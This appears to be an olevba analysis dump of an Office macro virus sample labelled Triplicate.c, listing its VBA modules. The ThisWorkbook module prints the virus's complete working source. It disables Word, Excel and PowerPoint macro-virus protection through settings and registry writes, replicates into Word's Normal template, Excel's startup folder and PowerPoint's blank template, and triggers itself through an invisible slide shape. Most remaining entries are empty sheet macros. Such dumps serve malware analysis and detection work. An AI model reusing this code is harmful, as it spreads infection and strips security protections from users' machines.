olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Triplicate v0.21 /1nternal
Private Sub Document_Close()
    On Error Resume Next
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set TT = Templates(1).VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountofLines
        AD.InsertLines 1, TT.Lines(1, TT.CountofLines)
        If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
            AD.InsertLines 1, NT.Lines(1, NT.CountofLines)
        End If
    End If
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        NT.DeleteLines 1, NT.CountofLines
        NT.InsertLines 1, AD.Lines(1, AD.CountofLines)
        Set xlApp = CreateObject("Excel.Application")
        If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountofLines)
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
        End If
        xlApp.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, NT.Lines(1, NT.CountofLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
    End If
    If TT.Lines(1, 1) <> "'<!--1nternal-->" Then
        TT.DeleteLines 1, TT.CountofLines
        TT.InsertLines 1, NT.Lines(1, NT.CountofLines)
    End If
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
            Set WordObj = CreateObject("Word.Application")
            WQuit = True
        End If
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        WordObj.Options.SaveNormalPrompt = False
        NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + TW.Lines(23, 3) + Chr(13) + Chr(10) + TW.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
        WordObj.Run "Normal.ThisDocument.DisableAV"
        NT.DeleteLines 1, NT.CountofLines
        NT.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Set NT = Nothing
        If WQuit = True Then WordObj.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Book1Obj.SaveAs Filename:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        Book1Obj.Close
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--1nternal-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountofLines)
    End If
End Sub
Private Sub actionhook(tristate)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        Set Home = ActivePresentation
        If UCase(Dir(Application.Path + "\Xlstart\Book1.")) <> UCase("BOOK1") Then
            Set WordObj = GetObject(, "Word.Application")
            If WordObj = "" Then
                Set WordObj = CreateObject("Word.Application")
                WQuit = True
            End If
            Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
            WordObj.Options.SaveNormalPrompt = False
            NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(23, 3) + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
            WordObj.Run "Normal.ThisDocument.DisableAV"
            NT.DeleteLines 1, NT.CountofLines
            NT.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            NT.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Set NT = Nothing
            If WQuit = True Then WordObj.Quit
            Set xlApp = CreateObject("Excel.Application")
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
            xlApp.Quit
            Set PBT = Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
            dontadd = False
            For Each ModComponent In PBT.VBProject.VBComponents
                If ModComponent.Name = "Triplicate" Then dontadd = True
            Next
            If dontadd <> True Then
                Set NewMod = PBT.VBProject.VBComponents.Add(1)
                NewMod.Name = "Triplicate"
                NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
                Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
                With ShapetoWack
                    .Name = "Triplicate"
                    .ZOrder (1)
                    .Line.Visible = False
                    .Fill.Visible = False
                    .ActionSettings(1).Action = 8
                    .ActionSettings(1).Run = "actionhook"
                End With
                PBT.Save
            End If
            PBT.Close
        End If
    End If
    ActivePresentation.SlideShowWindow.View.Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet17.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet18.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet19.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet19'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet20.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet20'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet21.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet21'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet22.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet23.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet47.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet47'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet25.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet25'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet26.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet26'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet27.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet27'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet28.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet28'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet29.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet29'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet30.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet30'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet31.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet31'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet32.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet32'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet46.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet46'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet34.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet35.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet35'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet36.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet37.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet37'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet45.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet45'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet42.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet42'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet40.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet40'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet41.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet41'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet43.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet43'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet39.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet39'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet44.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet44'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet48.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet48'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet49.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet49'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet50.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet50'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet51.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet51'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet52.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet52'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet53.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet53'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet54.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet54'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet55.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet55'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet56.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet56'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet57.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet57'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet58.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet58'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet59.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet59'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet60.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet60'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet61.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet61'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet62.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet62'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet63.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet63'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet64.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet64'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet65.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet65'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet24.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet24'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet66.cls 
in file: Virus.MSOffice.Triplicate.c-afba01f101dc7a3b07a1aadf0967a59fcf2cb2bf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet66'
